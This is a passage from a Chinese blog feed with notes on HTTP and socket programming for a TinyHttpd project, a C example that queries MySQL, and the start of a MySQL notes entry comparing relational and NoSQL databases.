<li>【强制】<code>VARCHAR</code>是可变长字符串，不预先分配存储空间，<code>长度不要超过5000</code>。如果存储长度大于此值，定义字段类型为TEXT，独立出来一张表，用主键来对应，避免影响其它字段索引效率x</li>
</ol>
]]></content>
      <categories>
        <category>缓存与数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>P-Tinyhttpd</title>
    <url>/2024/08/17/P-Tinyhttpd/</url>
    <content><![CDATA[<p>这是自学Linux网络编程过程中实现的小项目，存储在</p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>参考资料：<br><a href="https://www.runoob.com/http/http-intro.html">菜鸟教程-HTTP协议</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview">mozilla-HTTP协议</a><br><a href="https://blog.csdn.net/hansionz/article/details/86137260">HTTP协议讲解和简单HTTP服务器实现</a><br><a href="https://www.bilibili.com/video/BV1DJ4m1M77z/?spm_id_from=333.337.search-card.all.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷Linux嵌入式编程</a></p>
<p>HTTP（超文本传输协议，Hypertext Transfer Protocol）是一种用于从网络传输超文本到本地浏览器的传输协议。它定义了客户端与服务器之间请求和响应的格式。HTTP工作在TCP&#x2F;IP模型之上的C&#x2F;S（客户端—服务器client-server）协议，通常使用端口 80。</p>
<h4 id="HTTP协议的工作原理"><a href="#HTTP协议的工作原理" class="headerlink" title="HTTP协议的工作原理"></a>HTTP协议的工作原理</h4><p>HTTP 工作过程通常如下：</p>
<ol>
<li>客户端发起请求：用户通过客户端（如浏览器）输入URL，客户端与服务器HTTP端口建立一个TCP套接字连接，通过TCP套接字向服务器发起一个 HTTP 请求。</li>
<li>服务器处理请求：服务器接收到请求后，读取套接字，解析请求文本，根据请求的类型（如GET、POST等）和请求的资源，进行相应的处理。</li>
<li>服务器返回响应：服务器将处理结果包装成HTTP响应消息，写入套接字，发送回客户端。</li>
<li>客户端渲染页面：客户端接收到响应后，读取套接字，解析响应文本，查看状态码，根据响应内容（如HTML、图片等）渲染页面，展示给用户</li>
<li>断开TCP连接(请求头connection &#x3D; close)</li>
</ol>
<p>因此，实现一个基本的HTTP服务器就必须实现其处理请求和返回响应的功能</p>
<h4 id="HTTP协议的消息结构"><a href="#HTTP协议的消息结构" class="headerlink" title="HTTP协议的消息结构"></a>HTTP协议的消息结构</h4><p>HTTP消息分为两种类型：请求消息和响应消息。<br>一个HTTP客户端是一个应用程序（Web 浏览器或其他任何客户端），通过连接到服务器达到向服务器发送一个或多个HTTP的请求的目的。<br>一个HTTP服务器同样也是一个应用程序（通常是一个 Web 服务，通过接收客户端的请求并向客户端发送HTTP响应数据。</p>
<h5 id="客户端请求消息的格式"><a href="#客户端请求消息的格式" class="headerlink" title="客户端请求消息的格式"></a>客户端请求消息的格式</h5><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240817104421.png" alt="客户端请求消息的格式"></p>
<p>客户端发送的请求消息包括以下格式：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成，</p>
<ol>
<li>请求行（Request Line）：<ul>
<li>方法：如 GET、POST、PUT、DELETE等，指定要执行的操作。</li>
<li>请求URI（统一资源标识符）：请求的资源路径，通常包括主机名、端口号（如果非默认）、路径和查询字符串。</li>
<li>HTTP版本：如 HTTP&#x2F;1.1 或 HTTP&#x2F;2。</li>
<li>请求行的格式示例：GET &#x2F;index.html HTTP&#x2F;1.1</li>
</ul>
</li>
<li>请求头（Request Headers）：<ul>
<li>包含了客户端环境信息、请求体的大小（如果有）、客户端支持的压缩类型等。</li>
<li>常见的请求头包括Host、User-Agent、Accept、Accept-Encoding、Content-Length等。</li>
</ul>
</li>
<li>空行：<ul>
<li>请求头和请求体之间的分隔符，表示请求头的结束。</li>
</ul>
</li>
<li>请求体（可选）：<ul>
<li>在某些类型的HTTP请求（如 POST 和 PUT）中，请求体包含要发送给服务器的数据。</li>
</ul>
</li>
</ol>
<p>如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST  /htdocs/index.html  HTTP/1.1  \r\n</span><br><span class="line">Host: www.somenet.com               \r\n</span><br><span class="line">Content-Length:9                    \r\n</span><br><span class="line">\r\n</span><br><span class="line">color=red</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h5 id="服务器响应消息的格式"><a href="#服务器响应消息的格式" class="headerlink" title="服务器响应消息的格式"></a>服务器响应消息的格式</h5><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240817111117.png" alt="服务器响应消息的格式"></p>
<p>HTTP 响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文</p>
<ol>
<li>状态行（Status Line）：<ul>
<li>HTTP 版本：与请求消息中的版本相匹配。</li>
<li>状态码：三位数，表示请求的处理结果，如 200 表示成功，404 表示未找到资源。</li>
<li>状态信息：状态码的简短描述。</li>
<li>状态行的格式示例：HTTP&#x2F;1.1 200 OK</li>
</ul>
</li>
<li>响应头（Response Headers）：<ul>
<li>包含了服务器环境信息、响应体的大小、服务器支持的压缩类型等。</li>
<li>常见的响应头包括Content-Type、Content-Length、Server、Set-Cookie等。</li>
</ul>
</li>
<li>空行：<ul>
<li>响应头和响应体之间的分隔符，表示响应头的结束。</li>
</ul>
</li>
<li>响应体（可选）：<ul>
<li>包含服务器返回的数据，如请求的网页内容、图片、JSON数据等</li>
</ul>
</li>
</ol>
<p>如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK         \r\n</span><br><span class="line">Content-Type:text/html  \r\n</span><br><span class="line">Content-Length:362      \r\n</span><br><span class="line">\r\n</span><br><span class="line">&lt;html&gt;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>


<h4 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h4><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码(HTTP Status Code)的信息头（server header）用以响应浏览器的请求。</p>
<p>下面是常见的 HTTP 状态码：</p>
<blockquote>
<p>1xx（信息性状态码）：表示接收的请求正在处理。<br>2xx（成功状态码）：表示请求正常处理完毕。<br>3xx（重定向状态码）：需要后续操作才能完成这一请求。<br>4xx（客户端错误状态码）：表示请求包含语法错误或无法完成。<br>5xx（服务器错误状态码）：服务器在处理请求的过程中发生了错误</p>
</blockquote>
<p>其中最常见的就是以下几个：</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>状态信息</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>200</td>
<td>OK</td>
<td>请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td>400</td>
<td>Bad Request</td>
<td>客户端请求的语法错误，服务器无法理解</td>
</tr>
<tr>
<td>404</td>
<td>Not Found</td>
<td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error</td>
<td>服务器内部错误，无法完成请求</td>
</tr>
</tbody></table>
<h4 id="HTTP-请求方法"><a href="#HTTP-请求方法" class="headerlink" title="HTTP 请求方法"></a>HTTP 请求方法</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240817104910.png" alt="HTTP 请求方法"></p>
<h3 id="socket编程"><a href="#socket编程" class="headerlink" title="socket编程"></a>socket编程</h3><h4 id="Socket介绍"><a href="#Socket介绍" class="headerlink" title="Socket介绍"></a>Socket介绍</h4><p>套接字（Socket）是计算机网络通信中的一个基本概念，它是一种抽象的数据结构，用于在网络应用程序之间提供通信接口。套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口。使用套接字可以简化网络编程，无需理解底层协议内部工作原理</p>
<p>主要分为以下几种类型</p>
<ul>
<li>流式套接字（SOCK_STREAM）：基于TCP协议，是一个面向连接的套接字类型。它保证了数据的顺序和可靠传输，适用于需要可靠传输的应用场景，如HTTP、FTP等。</li>
<li>数据报套接字（SOCK_DGRAM）：基于UDP协议，是一个无连接的套接字类型。它不保证数据的顺序，但可以快速发送和接收数据，适用于对实时性要求较高但对数据可靠性要求不高的应用场景，如视频流、实时游戏等。</li>
<li>原始套接字：与标准套接字（流套接字和数据报套接字）不同，原始套接字可以读写内核没有处理的IP数据包，因此可以进行更底层的网络操作，如开发新的网络协议等。</li>
</ul>
<p><strong>工作原理</strong></p>
<p>套接字通过封装 TCP&#x2F;IP协议细节，提供了一组API，允许应用程序创建套接字、绑定地址和端口、监听连接、接受连接、发送和接收数据等。在网络通信中，通常一个套接字负责监听和接受外部连接(服务器套接字)，另一个套接字负责发起连接(客户端套接<br>字)。</p>
<h4 id="Socket函数"><a href="#Socket函数" class="headerlink" title="Socket函数"></a>Socket函数</h4><p>在头文件sys&#x2F;socket.h、sys&#x2F;types.h中定义了socket编程函数</p>
<h5 id="创建套接字"><a href="#创建套接字" class="headerlink" title="创建套接字"></a>创建套接字</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>domain：指定协议族。常见的协议族有<code>AF_INET（IPv4）</code>和<code>AF_INET6（IPv6）</code>。</li>
<li>type：指定套接字类型。常见的类型有<code>SOCK_STREAM</code>（流式套接字，基于<code>TCP</code>）和<code>SOCK_DGRAM</code>（数据报套接字，基于<code>UDP</code>）。</li>
<li>protocol：指定使用的特定协议。通常，当domain和type足以确定协议时，这个参数可以<code>设置为0</code>，让系统自动选择合适的协议。</li>
<li>返回值：成功时返回一个非负整数，这个整数是套接字的描述符（或称为文件描述符），它将在后续的套接字操作中用作引用。如果调用失败，则返回 -1，并设置 errno 以指示错误原因。</li>
</ul>
<h5 id="绑定地址和端口号"><a href="#绑定地址和端口号" class="headerlink" title="绑定地址和端口号"></a>绑定地址和端口号</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bind</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>sockfd：这是由socket()函数返回的套接字描述符。</li>
<li>addr：这是一个指向sockaddr（地址族）结构的指针，但实际上更常用的是它的特定类型，如sockaddr_in（用于IPv4）或sockaddr_in6（用于IPv6）。这个结构包含了要绑定的IP地址和端口号。</li>
<li>addrlen：这是addr指向的结构体的大小，通常以sizeof(struct sockaddr_in)或sizeof(struct sockaddr_in6)的形式给出。</li>
<li>返回值：函数成功时返回0，失败时返回-1并设置errno以指示错误原因。</li>
</ul>
<h5 id="结构体sockaddr、sockaddr-in"><a href="#结构体sockaddr、sockaddr-in" class="headerlink" title="结构体sockaddr、sockaddr_in"></a>结构体sockaddr、sockaddr_in</h5><p>sockaddr结构体是一个通用的套接字地址结构，它用于表示套接字地址（包括IP地址和端口号）。sockaddr_in结构体用于表示IPv4套接字地址，是sockaddr的特定类型，可以直接与sockaddr结构体进行类型转换（因为sockaddr_in和sockaddr_in6的第一个成员都是sa_family，这允许它们被当作sockaddr类型来传递）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span>  </span><br><span class="line">    <span class="type">sa_family_t</span> sin_family; <span class="comment">// 地址族，对于IPv4来说是AF_INET  </span></span><br><span class="line">    <span class="type">uint16_t</span> sin_port;      <span class="comment">// 端口号，网络字节序  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">// IPv4地址  </span></span><br><span class="line">    <span class="comment">// 某些系统可能还包含一些填充字节，以保持与sockaddr结构体大小对齐  </span></span><br><span class="line">&#125;;  </span><br><span class="line"><span class="comment">// 其中，in_addr结构体通常定义如下：  </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span>  </span><br><span class="line">    <span class="type">uint32_t</span> s_addr; <span class="comment">// IPv4地址，网络字节序  </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="监听套接字"><a href="#监听套接字" class="headerlink" title="监听套接字"></a>监听套接字</h5><p>listen() 函数用于将套接字设置为监听状态，以便它可以接受进入的连接请求。这个函数通常与流式套接字（如 TCP 套接字）一起使用，在服务器程序中非常常见。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">listen</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> backlog)</span>;  </span><br></pre></td></tr></table></figure>
<ul>
<li>backlog：这个参数指定了系统应该为相应套接字排队的最大连接数。这个数值告诉系统在拒绝新连接之前，可以有多少个未处理的连接请求等待accept()函数来处理。</li>
<li>返回值：成功时返回 0，失败时返回 -1 并设置 errno 以指示错误原因。</li>
</ul>
<h5 id="接受请求"><a href="#接受请求" class="headerlink" title="接受请求"></a>接受请求</h5><p>accept() 函数用于从已完成连接队列的头部返回下一个已完成连接。它通常与listen()函数一起使用，在服务器程序中非常常见，特别是处理TCP连接时。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">accept</span><span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>addr：这是一个指向 sockaddr 结构体的指针，该结构体用于存储接受连接的客户端的地址信息。如果调用者对此信息不感兴趣，可以将其设置为 NULL。</li>
<li>addrlen：这是一个指向 socklen_t 变量的指针，该变量在调用前应该包含 addr 指向的缓冲区的大小，在调用后，它将包含实际返回的地址的长度。如果 addr 是 NULL，则 addrlen 也应该是一个 NULL 指针。</li>
</ul>
<h5 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h5><p>end 函数将数据发送到连接的另一端（即服务器）。它需要至少两个参数：一个套接字文件描述符（标识了连接）和一个包含要发送数据的缓冲区。send 函数会尝试发送指定数量的字节，但实际发送的字节数可能较少，因此通常需要检查返回值来确定实际发送了多少数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">send</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>buf 是指向包含要发送数据的缓冲区的指针。</li>
<li>len 是要发送的字节数。</li>
<li>flags 通常是0，用于指定发送行为的不同选项（但在大多数情况下不使用）。</li>
</ul>
<h4 id="字节序及其转化"><a href="#字节序及其转化" class="headerlink" title="字节序及其转化"></a>字节序及其转化</h4><h5 id="网络字节序和主机字节序"><a href="#网络字节序和主机字节序" class="headerlink" title="网络字节序和主机字节序"></a>网络字节序和主机字节序</h5><p>网络字节序和主机字节序是计算机网络通信中两个重要的概念，关系到数据在不同主机之间传输时的字节顺序问题。</p>
<p><strong>网络字节序</strong></p>
<blockquote>
<p>又称为大端字节序（Big-Endian），是一种标准化的字节序，用于在网络通信中统一表示数据的存储顺序。在网络传输中，数据的高位字节（MSB，Most Significant Byte）被存储在低地址，而低位字节（LSB，Least Significant Byte）被存储在高地址。这种表示方式确保了数据在不同主机之间传输时能够被正确解释，无论这些主机的内部字节序如何。</p>
</blockquote>
<p><strong>主机字节序</strong></p>
<blockquote>
<p>主指特定主机或处理器所采用的字节序。在不同的计算机体系结构中，主机字节序可以有两种表示方式：大端序（Big-Endian）和小端序（Little-Endian）。现代处理器架构普遍采用小端序。小端序将数据的低位字节存储在内存的低地址端，而高位字节存储在内存的高地址端。这意呀着，从内存的低地址开始，首先读取到的是数据的低位字节。</p>
</blockquote>
<p>由于网络字节序采用大端序表示，而主机字节序可能是大端序也可能是小端序，因此在网络通信中，发送端和接收端通常需要进行字节序的转换。具体来说，发送端在发送数据之前，需要将主机字节序转换为网络字节序；接收端在接收到数据之后，需要将网络字节序转换回主机字节序。这样，双方才能正确地解析出传输的数据。</p>
<h5 id="字节序转化函数"><a href="#字节序转化函数" class="headerlink" title="字节序转化函数"></a>字节序转化函数</h5><p>包括htonl、htons、ntohl和ntohs，它们分别用于处理长整型（32位）和短整型（16位）数据的字节序转换，是标准C库的一部分，但在某些平台上可能需要包含特定的头文件（如&lt;arpa&#x2F;inet.h&gt;）才能使用。</p>
<ol>
<li>htonl 和 htons：用于在发送数据之前，将主机上的数据转换为网络字节序，以便在网络中传输<ul>
<li>htonl：Host TO Network Long。该函数将无符号长整型（uint32_t）从主机字节序转换为网络字节序（大端序）。</li>
<li>htons：Host TO Network Short。该函数将无符号短整型（uint16_t）从主机字节序转换为网络字节序（大端序）。</li>
</ul>
</li>
<li>ntohl 和 ntohs：用于在接收到网络数据之后，将数据的字节序转换回主机字节序，以便在主机上正确解析和处理。<ul>
<li>ntohl：Network TO Host Long。该函数将无符号长整型（uint32_t）从网络字节序（大端序）转换回主机字节序。</li>
<li>ntohs：Network TO Host Short。该函数将无符号短整型（uint16_t）从网络字节序（大端序）转换回主机字节序。</li>
</ul>
</li>
</ol>
<h4 id="网络编程的流程"><a href="#网络编程的流程" class="headerlink" title="网络编程的流程"></a>网络编程的流程</h4><p><strong>服务器端</strong></p>
<ol>
<li>构造socket: socket()</li>
<li>绑定地址: bind()</li>
<li>进入监听状态: listen()</li>
<li>获取客户端连接: accept(),返回与客户端交互的socket</li>
<li>创建两个子线程分别用于收发消息</li>
</ol>
<h3 id="Linux中使用C语言连接MySQL数据库"><a href="#Linux中使用C语言连接MySQL数据库" class="headerlink" title="Linux中使用C语言连接MySQL数据库"></a>Linux中使用C语言连接MySQL数据库</h3><p>以Ubuntu为例，安装了MySQL 8.0后，可以使用C语言连接MySQL数据库并进行操作</p>
<h4 id="安装MySQL客户端开发库"><a href="#安装MySQL客户端开发库" class="headerlink" title="安装MySQL客户端开发库"></a>安装MySQL客户端开发库</h4><p>安装MySQL的开发库，以便在C程序中使用MySQL API：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libmysqlclient-dev</span><br></pre></td></tr></table></figure>

<h4 id="编写C代码连接MySQL"><a href="#编写C代码连接MySQL" class="headerlink" title="编写C代码连接MySQL"></a>编写C代码连接MySQL</h4><p>下面是一个简单的C代码示例，用于连接MySQL数据库并执行一个查询：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql/mysql.h&gt;</span> <span class="comment">// 包含此头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    MYSQL *conn;</span><br><span class="line">    MYSQL_RES *res;</span><br><span class="line">    MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *server = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *user = <span class="string">&quot;root&quot;</span>; <span class="comment">// MySQL用户名</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *password = <span class="string">&quot;your_password&quot;</span>; <span class="comment">// MySQL密码</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *database = <span class="string">&quot;testdb&quot;</span>; <span class="comment">// 数据库名</span></span><br><span class="line"></span><br><span class="line">    conn = mysql_init(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接数据库</span></span><br><span class="line">    <span class="keyword">if</span> (conn == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;mysql_init() failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mysql_real_connect(conn, server, user, password, database, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;mysql_real_connect() failed\n&quot;</span>);</span><br><span class="line">        mysql_close(conn);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="keyword">if</span> (mysql_query(conn, <span class="string">&quot;SELECT * FROM test_table&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;SELECT * FROM test_table failed. Error: %s\n&quot;</span>, mysql_error(conn));</span><br><span class="line">        mysql_close(conn);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = mysql_store_result(conn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;mysql_store_result() failed. Error: %s\n&quot;</span>, mysql_error(conn));</span><br><span class="line">        mysql_close(conn);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出查询结果</span></span><br><span class="line">    <span class="type">int</span> num_fields = mysql_num_fields(res);</span><br><span class="line">    <span class="keyword">while</span> ((row = mysql_fetch_row(res))) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_fields; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, row[i] ? row[i] : <span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    mysql_free_result(res);</span><br><span class="line">    mysql_close(conn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="编译和运行"><a href="#编译和运行" class="headerlink" title="编译和运行"></a>编译和运行</h4><p>编译时需要链接MySQL客户端库，编译成功后，运行生成的可执行文件：：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o mysql_test mysql_test.c -lmysqlclient</span><br><span class="line">./mysql_test</span><br></pre></td></tr></table></figure>

<h4 id="常见错误处理"><a href="#常见错误处理" class="headerlink" title="常见错误处理"></a>常见错误处理</h4><ul>
<li><strong>无法连接数据库</strong>：检查用户名、密码、数据库名称，以及MySQL服务器是否正在运行。</li>
<li><strong>库文件未找到</strong>：确保<code>libmysqlclient-dev</code>已经安装，并且在编译时使用了<code>-lmysqlclient</code>进行链接。</li>
</ul>
<h4 id="进程和线程："><a href="#进程和线程：" class="headerlink" title="进程和线程："></a>进程和线程：</h4><blockquote>
<p>进程id、fork()、exec函数、waitpid()<br>线程id、pthread_create()、pthread_self()、线程退出和分离</p>
</blockquote>
<h2 id="轻量级HTTP服务器的C语言实现"><a href="#轻量级HTTP服务器的C语言实现" class="headerlink" title="轻量级HTTP服务器的C语言实现"></a>轻量级HTTP服务器的C语言实现</h2><p>参考资料：<br><a href="https://www.bilibili.com/video/BV1Ta411A7Bs/?spm_id_from=333.788.recommend_more_video.0&vd_source=20530c92c1be8bd70e37346e3a5c037a">TinyHttpd项目视频详解</a><br><a href="https://github.com/cbsheng/tinyhttpd">TinyHttpd项目详细注释版</a></p>
]]></content>
      <categories>
        <category>其他语言技术</category>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>http协议</tag>
        <tag>Socket编程</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-Note1-语法语句</title>
    <url>/2024/09/07/MySQL-Note1-%E8%AF%AD%E6%B3%95%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<span id="more"></span>

<p>参考文献：<br><a href="https://mysql.net.cn/doc/refman/8.0/en/">MySQL中文文档</a><br><a href="https://dev.mysql.com/doc/refman/8.0/en/">MySQL官方英文文档</a><br><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?p=26&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">视频</a><br><a href="https://blog.csdn.net/janzen_pan/article/details/123016925">数据库知识1</a><br><a href="https://blog.csdn.net/rakish_wind/article/details/85028846">数据库知识2</a></p>
<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="基本概述"><a href="#基本概述" class="headerlink" title="基本概述"></a>基本概述</h2><p>常见数据库管理软件：</p>
<ul>
<li>关系型数据库：Oracle MySql Microsoft-SQL-Server DB2 PostgreSQL SQLite</li>
<li>非关系型数据库：</li>
</ul>
<p>DDL:数据定义语言。create\alter\drop\rename\truncate …<br>    一旦执行不可回滚rollback！<br>DML:数据操作语言。insert\delete\update\select …<br>    默认不可回滚，自动commit，可以设置禁止自动commit从而可以回滚<code>set autocommit = false</code><br>DCL:数据控制语言。commit\rollback\savepoint\grant\revoke …</p>
<h3 id="关系型数据库和非关系型数据库"><a href="#关系型数据库和非关系型数据库" class="headerlink" title="关系型数据库和非关系型数据库"></a>关系型数据库和非关系型数据库</h3><p>关系型数据库：关系型数据库（Relational Database Management System, RDBMS）是一种基于关系模型的数据库管理系统。它使用表格（table）来存储和管理数据，并通过表之间的关联（relationship）来实现数据的组织和管理。在关系型数据库中，所有的数据都存储在表中，每个表都包含了一系列的行（row）和列（column），其中行代表记录（record），列代表字段（field）。关系型数据库很适合多表复杂查询，具有四大特性：原子性、一致性、隔离性、持久性（ACID）</p>
<p>关系型数据库的核心特性包括：</p>
<ul>
<li>表结构：每个表都有一个明确的结构，定义了表中可以存储哪些类型的数据。表中的每一列都有一个数据类型（如整数、字符串、日期等），以及一个描述列内容的名称。</li>
<li>关系：通过定义表之间的关联（如外键约束），关系型数据库可以表达复杂的数据关系。这种关联使得可以轻松地查询和更新多个表中的数据。</li>
<li>SQL语言：关系型数据库使用SQL（Structured Query Language，结构化查询语言）作为数据操作和查询的标准语言。SQL提供了丰富的语法来执行数据的增、删、改、查（CRUD）操作。</li>
<li>事务处理：关系型数据库支持事务处理，确保数据的一致性和完整性。事务处理包括原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）和持久性（Durability），即ACID特性。</li>
<li>安全性：关系型数据库提供了多种安全特性，如用户认证、访问控制列表（ACL）和加密等，以保护数据的安全。<br>并发控制：支持多个用户同时访问和修改数据库，通过并发控制机制（如锁）来避免数据冲突和不一致。</li>
</ul>
<p>非关系型数据库（NoSQL）是相对于关系型数据库（SQL）的一种数据库管理系统，它的数据储存不需要固定的表格模式，且在大数据和实时应用处理上有显著优势。以下是对非关系型数据库的概念和常见类别的详细解析：<br>非关系型数据库的概念</p>
<p>非关系型数据库是一种非关系型的、分布式的、且一般不保证遵循ACID（原子性、一致性、隔离性、持久性）原则的数据存储系统。非关系型数据库以其灵活的数据模型、高可扩展性和高性能在大数据和实时应用处理中占据重要地位。不同的非关系型数据库类型适用于不同的应用场景，选择合适的数据库类型对于系统的性能和可扩展性至关重要。它的主要特点包括：</p>
<ul>
<li>数据模型灵活：不需要预先定义数据结构，可以存储复杂的数据类型。</li>
<li>横向扩展：可通过增加服务器进行扩展，具有高可扩展性。</li>
<li>读写性能高：特别适合大数据和高并发场景。</li>
</ul>
<p>非关系型数据库主要有以下几种类型：</p>
<ul>
<li>键值存储数据库（Key-Value Stores）<ul>
<li>概念：将数据存储为键值对的形式，可以快速地根据键获取对应的值。</li>
<li>特点：查找速度快，适用于处理大量数据的高访问负载，也常用于缓存和日志系统。</li>
<li>典型产品：Redis、Memcached。</li>
</ul>
</li>
<li>文档存储数据库（Document Stores）<ul>
<li>概念：以文档的形式存储数据，文档可以是JSON、XML等格式，能够存储结构化数据和非结构化数据。</li>
<li>特点：适合复杂的查询和半结构化数据的存储，灵活性高。</li>
<li>典型产品：MongoDB、CouchDB。</li>
</ul>
</li>
<li>列存储数据库（Column-Family Stores）<ul>
<li>概念：将数据存储在列中，而不是传统的关系型数据库中的行。</li>
<li>特点：查找速度快，可扩展性强，更适合分布式存储和处理大量数据。</li>
<li>典型产品：Cassandra、HBase。</li>
</ul>
</li>
<li>图形数据库（Graph Databases）<ul>
<li>概念：用于存储和查询图形结构的数据，通过节点和边来表示数据模型。</li>
<li>特点：能够高效地处理复杂的关系和网络结构，常用于社交网络、推荐系统等。</li>
<li>典型产品：Neo4j、ArangoDB。</li>
</ul>
</li>
<li>时间序列数据库（Time-Series Stores）<ul>
<li>概念：专为处理时间相关的数据而设计，如日志文件、用户活动、传感器数据等。</li>
